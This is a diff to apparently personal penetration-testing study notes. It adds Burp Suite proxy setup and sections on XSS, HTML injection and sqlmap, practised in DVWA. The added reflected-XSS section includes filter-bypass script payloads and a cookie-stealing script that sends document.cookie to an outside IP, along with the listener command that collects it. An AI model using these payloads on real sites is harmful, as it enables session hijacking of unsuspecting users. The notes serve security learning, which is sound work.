@@ -26,7 +26,7 @@ Apache2 files : /var/www/html
 | nslookup | Lookup ip address |
 | whois | ip/domain details |
 | whatweb | web scanner to scan hosts |
-| theHarvester | email gathering |
+| theHarvester | email gathering (NOT VERY RELIABLE) |
 | hunter.io | website for email gathering |
 | redhawk | website information gathering |
 | sherlock | find accounts across social media using username |
@@ -343,13 +343,17 @@ Intercepts and change http requests and responses.
 
 **Have to change proxy settings manually in web browser.**
 
+- Change the browser proxy and change to manual proxy configuration. 
+(And add the Proxy listener Address which is in Burpsuite Proxy tab)
+- Check "Use this proxy for all protocols"
+
 To access https open:
 
 - http://burp
 - Download CA certificate
 - In web browser import the certificate (Check privacy section) and click trust this CA.
 
-To prevent manually forwarding packets: Turn Intercept Off in the suite.
+**To prevent manually forwarding packets: Turn Intercept Off in the suite.**
 
 ## ShellShock (2014)
 
@@ -422,3 +426,62 @@ Two commands can also be run like : command1 | command2
 - Use command injection to run payload in target:
 	- ;python *python payload*
 
+
+## Reflected XSS and Cookie Stealing
+
+Ways to run XSS:
+
+```
+<script>alert('1')</script>
+<SCRIPT>alert('1')</script>
+<scr<script>ipt>alert('1')</script>
+```
+
+Starting HTTP server on port (eg: 8000):
+```
+python -m SimpleHTTPServer 8000
+```
+
+Inecting Javascript to steal cookie session:
+
+```
+<SCRIPT>document.write('<img src="http://192.168.1.9:8000/' + document.cookie + ' ">');</script>
+```
+
+document.cookie is an ENVIRONMENT variable. document.cookie is the cookie session of the user visiting that page.
+
+The HTTP server will print the cookie session id.
+
+The cookies can be used via Cookie Manager addons in web browser.
+
+## Stored XSS
+
+Can test in DVWA.
+We can select the "NAME" field in inspect tab and change the maxlen and submit the javascript code.
+
+***Stored is more dangerous because the Javascript code gets "Stored" and is run everytime the page is loaded.*** 
+
+## HTML injection
+
+Injecting HTML tags into the page. 
+
+Redirecting to a different webpage:
+```	
+<meta http-equiv="refresh" content="0; url=http://google.com" />
+```
+
+## SQL injection
+
+Error based SQL injection : There is an error thrown when there is wrong sql query done.
+
+### Sqlmap
+
+Program to run sql injections automatically
+
+Use sqlmap --help to get started/ man sqlmap.
+
+Points to remember:
+
+- The & can be interpreted by bash terminal as a special character. Escape it with \&.
+- Cookie session values can be manually grabbed from developer tools of web browser.
+	- --cookie='cookiename=cookievalue;.....'
